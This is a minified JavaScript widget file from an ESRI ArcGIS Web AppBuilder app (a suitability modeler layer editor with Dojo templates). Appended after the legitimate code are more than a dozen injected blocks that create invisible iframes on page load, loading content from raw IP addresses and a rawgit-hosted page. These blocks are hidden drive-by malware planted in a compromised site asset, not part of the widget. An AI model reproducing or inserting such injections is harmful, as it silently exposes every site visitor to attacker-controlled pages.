// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SuitabilityModeler/wro/templates/RemapRangeEditor.html":'\x3ctr\x3e\r\n  \x3ctd class\x3d"${baseClass}-label" data-dojo-attach-point\x3d"labelNode"\x3e\x3c/td\x3e\r\n  \x3ctd\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"slider"\x3e\x3c/div\x3e\r\n  \x3c/td\x3e\r\n  \x3ctd\x3e\x3cinput type\x3d"text" class\x3d"${baseClass}-ouput-value"\r\n    data-dojo-type\x3d"dijit/form/NumberTextBox"\r\n    data-dojo-attach-point\x3d"outputValueNode"\r\n    data-dojo-props\x3d"required:true"/\x3e\x3c/td\x3e\r\n\x3c/tr\x3e\r\n',
"url:widgets/SuitabilityModeler/wro/templates/WeightedOverlayLayerEditor.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"layer-row"\x3e\r\n    \x3cdiv class\x3d"layer-row--value pull-right"\x3e\r\n      \x3cinput class\x3d"${baseClass}-weight" type\x3d"text"\r\n        data-dojo-type\x3d"dijit/form/NumberTextBox"\r\n        data-dojo-attach-point\x3d"weightNode"\r\n        data-dojo-attach-event\x3d"onChange:_onWeightChange,onKeyUp:_onWeightChange,onMouseUp:_onFocus,onBlur:_onBlur"\r\n        data-dojo-props\x3d"constraints: {max: 100, min: 0, round:0},required:true"\r\n      /\x3e\x3cspan class\x3d"layer-row--value-mark"\x3e\x26#37;\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"layer-row--title" data-dojo-attach-point\x3d"layerNode" \x3e\r\n      \x3ci class\x3d"sliders-button pull-right" data-dojo-attach-point\x3d"iconNode"\x3e\x3c/i\x3e\r\n      \x3clabel class\x3d"${baseClass}-label" data-dojo-attach-point\x3d"labelNode"\x3e\x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"remapRangesEditorWrapper"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"remapRangesEditorContainer"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/dom-class dojo/dom-style dojo/string dojo/Evented dojo/fx dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dijit/_Container ./containerUtils dojo/text!./templates/RemapRangeEditor.html dojo/text!./templates/WeightedOverlayLayerEditor.html dijit/form/HorizontalSlider dijit/form/NumberTextBox".split(" "),function(c,r,l,d,m,t,u,g,n,h,k,p,q,v,w,x,y){var z=c([h,k,p,g],{i18n:null,templateString:w,baseClass:"reclass-range-editor",
_setRemapRangeAttr:function(a){var b=" ("+(a.inputMin===a.inputMax?a.inputMin+"":a.inputMin+" - "+a.inputMax)+")";this.labelNode.innerHTML=a.label.substr(0,14)+(15<a.label.length?"\x26hellip;":"")+b;this.labelNode.title=a.label+b;this.outputValueNode.set("value",a.outputValue)},postCreate:function(){var a=this;this.inherited(arguments);this.outputValueNode.set("constraints",{round:0});this.sliderObject=new y({"class":"slider-primary",name:"slider",value:this.outputValueNode.value,minimum:0,maximum:9,
intermediateChanges:!0,discreteValues:10,showButtons:!1},this.slider);this.sliderObject.startup();this.own(d(this.sliderObject,"Change",function(b){a.outputValueNode.set("value",b)}));this.own(d(this.outputValueNode,"Change",function(b){a.outputValueNode&&a.outputValueNode.isValid()&&(a.remapRange.outputValue=b,a.sliderObject.set("value",b))}))},setOutputRange:function(a,b){var e=this.outputValueNode,c=u.substitute(this.i18n.wro.validation.rangeMessage,[a,b]);e.set("constraints",{min:a,max:b});e.set("rangeMessage",
c);this.sliderObject.set({minimum:a,maximum:b})}}),A=c([h,k,q,g],{i18n:null,templateString:'\x3cdiv\x3e\x3ctable class\x3d"${baseClass}-table"\x3e\x3ctbody data-dojo-attach-point\x3d"containerNode"\x3e\x3c/tbody\x3e\x3c/table\x3e\x3c/div\x3e',minOutputValue:0,maxOutputValue:0,baseClass:"remap-ranges-editor",_setRemapRangesAttr:function(a){var b=[],e;for(e in a)b.push([a[e],a[e].inputMin]);b.sort(function(a,b){return a[1]-b[1]});a=[];for(var c in b)a.push(b[c][0]);var f=this,d;v.removeChildren(this);
l.forEach(a,function(a){a.label||(a.label=a.inputMin+" - "+a.inputMax);d=new z({i18n:f.i18n,remapRange:a});d.setOutputRange(f.minOutputValue,f.maxOutputValue);f.addChild(d)})},getRemapRanges:function(){var a=[];l.forEach(this.getChildren(),function(b){a.push(b.getRemapRange())});return a}});return c([h,k,p,q,g],{i18n:null,templateString:x,baseClass:"weighted-overlay-layer-editor",_setOverlayLayerAttr:function(a){this.weightNode.set("value",a.weight);this.labelNode.innerHTML=a.title;this.remapRangesEditor=
new A({i18n:this.i18n,minOutputValue:0,maxOutputValue:9,remapRanges:a.remapRanges},this.remapRangesEditorContainer)},postCreate:function(){this.inherited(arguments);this.attachWeightingToggle();this.weightNode.rangeMessage=this.i18n.wro.validation.rangeMessage100},attachWeightingToggle:function(){t.set(this.remapRangesEditorWrapper,"display","none");var a=0;this.own(d(this.layerNode,"click",r.hitch(this,function(){0===a?(m.add(this.domNode,"is-open"),n.wipeIn({node:this.remapRangesEditorWrapper}).play(),
a=1):(m.remove(this.domNode,"is-open"),n.wipeOut({node:this.remapRangesEditorWrapper}).play(),a=0)})))},isValid:function(){return this.weightNode.isValid()},_onWeightChange:function(){var a=parseInt(this.weightNode.valueNode.value,10),a=isNaN(a)?0:a;this.overlayLayer.weight=a;this.emit("WeightChange",a)},_onFocus:function(){this.weightNode.focusNode.select()},_onBlur:function(){var a=parseInt(this.weightNode.valueNode.value,10);isNaN(a)&&(this.weightNode.value=0,this.emit("WeightChange",a))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});